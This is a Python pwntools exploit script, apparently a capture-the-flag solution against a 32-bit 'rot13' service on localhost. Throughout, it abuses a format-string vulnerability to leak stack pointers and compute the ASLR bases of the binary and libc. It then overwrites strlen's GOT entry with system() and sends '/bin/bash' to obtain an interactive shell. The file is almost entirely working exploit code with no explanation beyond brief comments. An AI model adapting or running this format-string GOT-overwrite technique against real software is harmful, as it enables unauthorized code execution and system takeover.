from pwn import *

exe = ELF("rot13")
context(binary=exe)

REMOTE = 1


def connect_remote():
	global libc
	libc = ELF("rot13-libc.so")
	return remote("localhost", 20006)

def connect_local():
	global libc
	libc = ELF("/lib/i386-linux-gnu/libc.so.6")
	r = exe.process()
	# gdb.attach(r, "c")
	return r

def connect():
	return connect_remote() if REMOTE else connect_local()


def rot13_char(c):
	if not c.isalpha():
		return c
	
	return chr(((ord(c.upper()) - ord('A') + 13) % 26 + ord('A')) | (ord(c) & 0x20))

def rot13(s):
	return "".join(map(rot13_char, s))

def do_rot13(r, data):
	r.recvuntil("to be rot13 encrypted:\n")
	r.sendline(rot13(data))
	
	r.recvuntil("Rot13 encrypted data: ")
	text = r.recvuntil("Enter some text").rsplit("\n", 1)[0]
	info("Got: %r" % text)
	return text


def main():
	r = connect()
	
	# Determine exe's ASLR slide by leaking a return address and rounding
	# down to the previous page
	exe_addr_str = do_rot13(r, "%3$p").strip()
	exe_addr = int(exe_addr_str, 16)
	exe.address = exe_addr & ~0xfff
	info("rot13 ASLR slide: 0x%x" % exe.address)
	
	# Determine libc's ASLR slide in the same manner
	libc_addr_str = do_rot13(r, "%2$p").strip()
	libc_addr = int(libc_addr_str, 16)
	libc_seen = 0xf75ce325
	libc_base_seen = 0xf75a9000
	libc.address = (libc_addr - (libc_seen - libc_base_seen) + 0x800) & ~0xfff
	info("libc ASLR slide: 0x%x" % libc.address)
	
	# Replace strlen() with system() using a GOT replace
	fmt_writes = {
		exe.got["strlen"]: libc.symbols["system"]
	}
	
	fmt = fmtstr.fmtstr_payload(
		offset=7,
		writes=fmt_writes,
		numbwritten=0,
		write_size="short")
	
	do_rot13(r, fmt)
	
	# Invoke strlen() (now system()) on this text
	r.sendline("/bin/bash")
	
	info("Got a shell!")
	r.interactive()


if __name__ == "__main__":
	main()
